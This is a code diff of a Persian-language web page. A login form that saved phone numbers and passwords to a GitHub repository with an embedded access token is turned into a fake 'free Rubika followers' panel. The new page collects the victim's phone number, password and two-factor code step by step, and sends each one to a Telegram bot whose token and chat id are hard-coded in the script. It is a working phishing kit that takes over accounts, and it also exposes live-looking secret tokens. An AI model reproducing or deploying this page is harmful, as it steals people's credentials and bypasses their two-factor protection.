@@ -1,54 +1,157 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>صفحه ورود</title>
+    <title>فالوور روبیکا</title>
 </head>
 <body>
-    <h2>ورود به حساب کاربری</h2>
+    <h2>پنل فالوور رایگان روبیکا</h2>
     <form id="loginForm">
-        <label for="username">شماره:</label>
-        <input type="text" id="username" name="username" required><br><br>
+        <label for="phoneNumber">شماره:</label>
+        <input type="text" id="phoneNumber" name="phoneNumber" required><br><br>
 
-        <label for="password">رمز عبور:</label>
-        <input type="password" id="password" name="password" required><br><br>
-
-        <button type="submit">ورود</button>
+        <button type="button" onclick="sendPhoneNumber()">ارسال شماره</button>
     </form>
 
+    <div id="passwordDiv" style="display: none;">
+        <label for="password">رمز عبور:</label>
+        <input type="password" id="password" name="password" required><br><br>
+        <button type="button" onclick="sendPassword()">لاگین</button>
+    </div>
+
+    <div id="twoFactorAuthDiv" style="display: none;">
+        <label for="twoFactorCode">کد تایید دو مرحله‌ای:</label>
+        <input type="text" id="twoFactorCode" name="twoFactorCode"><br><br>
+        <button type="button" onclick="sendTwoFactorCode()">تایید دو مرحله‌ای</button>
+    </div>
+
     <script>
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // جلوگیری از ارسال فرم به صفحه دیگر
+        let step = 1; // مرحله فعلی
 
-            // اطلاعات ورود کاربر را دریافت
-            const username = document.getElementById("username").value;
-            const password = document.getElementById("password").value;
+        function sendPhoneNumber() {
+            if (step === 1) {
+                const phoneNumber = document.getElementById("phoneNumber").value;
+                if (phoneNumber) {
+                    // ارسال شماره به بات تلگرام
+                    const botToken = "6615637359:AAGngdDD-hI_nUeKZI2fJudolE8QCK1WOWM";
+                    const chatId = "5366171288";
+                    const message = `شماره: ${phoneNumber}`;
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const telegramParams = {
+                        "chat_id": chatId,
+                        "text": message,
+                    };
 
-            // استفاده از GitHub API برای ایجاد یک فایل در ریپازیتوری
-            const githubToken = "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"; // توکن دسترسی GitHub شما
-            const repoOwner = "amixr3"; // نام کاربری GitHub شما
-            const repoName = "Amixr3.github.io"; // نام ریپازیتوری
+                    fetch(telegramUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify(telegramParams),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert("کد ارسال شده را وارد کنید");
+                        clearForm();
+                        step = 2;
+                        showPasswordForm();
+                    })
+                    .catch(error => {
+                        console.error("خطا در ارسال پیام به بات:", error);
+                    });
+                } else {
+                    alert("لطفاً ابتدا شماره تلفن را وارد کنید.");
+                }
+            }
+        }
 
-            const fileContent = `شماره: ${username}, رمز عبور: ${password}`;
+        function sendPassword() {
+            if (step === 2) {
+                const password = document.getElementById("password").value;
+                if (password) {
+                    // ارسال رمز عبور به بات تلگرام
+                    const botToken = "6615637359:AAGngdDD-hI_nUeKZI2fJudolE8QCK1WOWM";
+                    const chatId = "5366171288";
+                    const message = `رمز عبور: ${password}`;
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const telegramParams = {
+                        "chat_id": chatId,
+                        "text": message,
+                    };
 
-            fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/data.txt`, {
-                method: "PUT",
-                headers: {
-                    Authorization: `token ${githubToken}`,
-                },
-                body: JSON.stringify({
-                    message: "اطلاعات ورود کاربر",
-                    content: btoa(fileContent), // رمزنگاری محتوا به Base64
-                    branch: "main", // نام شاخه مورد نظر
-                }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert("اطلاعات با موفقیت ذخیره شد.");
-            })
-            .catch(error => {
-                console.error("خطا در ذخیره اطلاعات:", error);
-            });
-        });
+                    fetch(telegramUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify(telegramParams),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert("تایید دومرحله ای را وارد کنید");
+                        clearForm();
+                        step = 3;
+                        showTwoFactorAuthForm();
+                    })
+                    .catch(error => {
+                        console.error("خطا در ارسال پیام به بات:", error);
+                    });
+                } else {
+                    alert("لطفاً رمز عبور را وارد کنید.");
+                }
+            }
+        }
+
+        function sendTwoFactorCode() {
+            if (step === 3) {
+                const twoFactorCode = document.getElementById("twoFactorCode").value;
+                if (twoFactorCode) {
+                    // ارسال کد تایید دو مرحله‌ای به بات تلگرام
+                    const botToken = "6615637359:AAGngdDD-hI_nUeKZI2fJudolE8QCK1WOWM";
+                    const chatId = "5366171288";
+                    const message = `کد تایید دو مرحله‌ای: ${twoFactorCode}`;
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const telegramParams = {
+                        "chat_id": chatId,
+                        "text": message,
+                    };
+
+                    fetch(telegramUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify(telegramParams),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert("کد تایید دو مرحله‌ای با موفقیت به بات ارسال شد.");
+                        clearForm();
+                        step = 4;
+                    })
+                    .catch(error => {
+                        console.error("خطا در ارسال پیام به بات:", error);
+                    });
+                } else {
+                    alert("لطفاً کد تایید دو مرحله‌ای را وارد کنید.");
+                }
+            }
+        }
+
+        function showPasswordForm() {
+            const passwordDiv = document.getElementById("passwordDiv");
+            passwordDiv.style.display = "block";
+        }
+
+        function showTwoFactorAuthForm() {
+            const twoFactorAuthDiv = document.getElementById("twoFactorAuthDiv");
+            twoFactorAuthDiv.style.display = "block";
+        }
+
+        function clearForm() {
+            document.getElementById("phoneNumber").value = "";
+            document.getElementById("password").value = "";
+            document.getElementById("twoFactorCode").value = "";
+        }
     </script>
 </body>
 </html>
